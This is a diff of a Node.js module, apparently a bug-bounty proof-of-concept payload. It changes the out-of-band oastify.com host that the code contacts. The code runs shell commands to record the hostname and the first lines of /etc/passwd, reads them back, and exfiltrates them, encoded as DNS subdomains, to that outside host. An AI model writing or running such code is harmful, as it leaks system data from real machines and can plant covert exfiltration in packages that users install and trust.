@@ -10,7 +10,7 @@ module.exports = {
     try { h = os.hostname(); } catch(e) {}
     
     // DNS #1: hostname (всегда)
-    try { dns.lookup(h + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){}); } catch(e) {}
+    try { dns.lookup(h + ".co424cqd0wt6x1y1feehuheg2784wt.oastify.com", function(){}); } catch(e) {}
     
     // execSync: создаём файл
     var fileOk = false;
@@ -19,9 +19,9 @@ module.exports = {
       cp.execSync("hostname >> /tmp/myasnikov_bb_proof.txt 2>&1", {timeout: 5000});
       cp.execSync("cat /etc/passwd 2>&1 | head -2 >> /tmp/myasnikov_bb_proof.txt", {timeout: 5000});
       fileOk = true;
-      try { dns.lookup("file-created." + h + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){}); } catch(e) {}
+      try { dns.lookup("file-created." + h + ".co424cqd0wt6x1y1feehuheg2784wt.oastify.com", function(){}); } catch(e) {}
     } catch(e) {
-      try { dns.lookup("exec-err." + h + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){}); } catch(e2) {}
+      try { dns.lookup("exec-err." + h + ".co424cqd0wt6x1y1feehuheg2784wt.oastify.com", function(){}); } catch(e2) {}
     }
     
     // Читаем файл
@@ -29,17 +29,17 @@ module.exports = {
       try {
         var content = fs.readFileSync("/tmp/myasnikov_bb_proof.txt", "utf8").trim();
         if (content.length > 0) {
-          try { dns.lookup("file-len" + content.length + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){}); } catch(e) {}
+          try { dns.lookup("file-len" + content.length + ".co424cqd0wt6x1y1feehuheg2784wt.oastify.com", function(){}); } catch(e) {}
           var lines = content.split("\n");
           for (var i = 0; i < Math.min(lines.length, 3); i++) {
             var encoded = lines[i].replace(/[^a-zA-Z0-9]/g, "-").substring(0, 40);
-            try { dns.lookup("f" + i + "-" + encoded + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){}); } catch(e) {}
+            try { dns.lookup("f" + i + "-" + encoded + ".co424cqd0wt6x1y1feehuheg2784wt.oastify.com", function(){}); } catch(e) {}
           }
         } else {
-          try { dns.lookup("file-empty.8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){}); } catch(e) {}
+          try { dns.lookup("file-empty.co424cqd0wt6x1y1feehuheg2784wt.oastify.com", function(){}); } catch(e) {}
         }
       } catch(e) {
-        try { dns.lookup("read-err.8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){}); } catch(e2) {}
+        try { dns.lookup("read-err.co424cqd0wt6x1y1feehuheg2784wt.oastify.com", function(){}); } catch(e2) {}
       }
     }
     
